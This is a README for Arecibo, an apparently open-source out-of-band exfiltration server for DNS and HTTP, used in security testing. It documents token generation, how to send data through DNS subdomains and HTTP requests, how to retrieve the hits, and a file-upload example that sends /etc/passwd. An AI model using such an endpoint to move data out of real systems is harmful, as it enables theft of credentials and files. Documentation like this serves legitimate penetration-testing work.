# Arecibo
Endpoint for Out-of-Band Exfiltration (DNS & HTTP)

#### Authors
Juan Manuel Fernández ([@TheXC3LL](https://twitter.com/TheXC3LL)) & Pablo Martinez ([@Xassiz](https://twitter.com/Xassiz))


## DNS Exfiltration
Create a new token:
```
curl localhost:5000/generatedns

{"htoken": "c008b5dd22817c50441522f917c66743"} 
```
Now you can use this identificative token to do DNS resolutions (ABCD.TOKEN.x.yourdomain.com):

```
> test-exfiltracion.c008b5dd22817c50441522f917c66743.x.DOMINIO
Server:         127.0.0.1
Address:        127.0.0.1#53

Name:   DOMINIO
Address: 127.0.0.1
```

You can check the hits and the data exfiltrated via /hitsdns/TOKEN:

```
curl localhost:5000/hitsdns/c008b5dd22817c50441522f917c66743

{"hits": [{"htoken": "c008b5dd22817c50441522f917c66743", "data": "test-exfiltracion", "id": 9, "timestamp": 1541748637.165287}]} 

```

If you want all the data concatenated use /dumpdns/token:

```
curl localhost/dumpdns/c008b5dd22817c50441522f917c66743

{"dump": "test-exfiltracionconcatenatedtootherinfo"}
```

## HTTP Exfiltration

Generate token:
```
curl localhost:5000/generatehttp

{"htoken": "2aa88ba02cbc0d6b72213fc117ae03dc"}
```

Now you can exfiltrate information through HTTP requests ( http://yourodmain.com/h/TOKEN). The GET / POST parameters, headers and IP will be registered by Arecibo. 

```
curl http://localhost:50000/h/2aa88ba02cbc0d6b72213fc117ae03dc
It works!
```

To retrieve de info, use /hitshttp/TOKEN:

```
 curl http://localhost:5000/hitshttp/2aa88ba02cbc0d6b72213fc117ae03dc
 
{"hits": [{"get": {}, "timestamp": 1541592259.541545, "headers": {"X-Real-Ip": "x", "Connection": "close", "Host": "x", "Accept": "*/*", "User-Agent": "curl/7.55.1"}, "htoken": "2aa88ba02cbc0d6b72213fc117ae03dc", "post": {}, "ip_address": "x"}]}
```

If you need to show an arbitrary HTML, HEADERS or status code use the POST method to set its values (body must be base64-encoded):

```
curl localhost:5000/generatehttp -H "Content-Type: application/json" --data '{"body" :"SGVsbG8gd29ybGQhIAo=", "headers":{"Server":"PWNED"}, "status" : 504}'
{
    "htoken": "324e18288eed54548392c5a65514b3dc"
}
```

## Dynamic DNS resolution
Arecibo resolves dominais with the schema X.Y.Z.A.ip.yourdomain.com as X.Y.Z.A:
```
> 10.0.0.1.ip.yourdomain.com
Server:         127.0.0.1
Address:        127.0.0.1#53

Name:   yourdomain.com
Address: 10.0.0.1
```

## File Transfer

Upload a file using /upload endpoint:
```
curl localhost:5000/upload -F 'x-file=@/etc/passwd'

{"htoken": "36981274bdb9cc833472681caeb82337"}
```

To download it use the generated token:

```
curl localhost:5000/download/36981274bdb9cc833472681caeb82337 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## IP info

Shows client IP via /ip:

```
curl localhost:5000/ip
{"ip": "127.0.0.1"}
```

## Installing & Configuring

You need to install pdns & pdns-backend-pipe from your distro repos, and the modules flask & flask_restful for python.

1. Edit the configuration of arecibo-dns-backend.py with your values
2. Set execution privileges `chmod +x arecibo-dns-backend.py`
3. Edit pdns.conf (check where is in your distro)
```
setuid=1001
setgid=1001
launch=pipe
pipe-command=/your/path/arecibo-dns-backend.py
```
(Change the setuid/setgid for the values used to run the API script, they must be the same)

4. Run arecibo-api.py & pdns_server (check where is in your distro)

**YOUR SERVER MUST BE CONFIGURED AS AUTHORITATIVE DNS FOR YOUR DOMAIN**

**IMPORTANT:** You must set up a nginx or other reverse proxy in front of Arecibo in order to provide authentication & security.
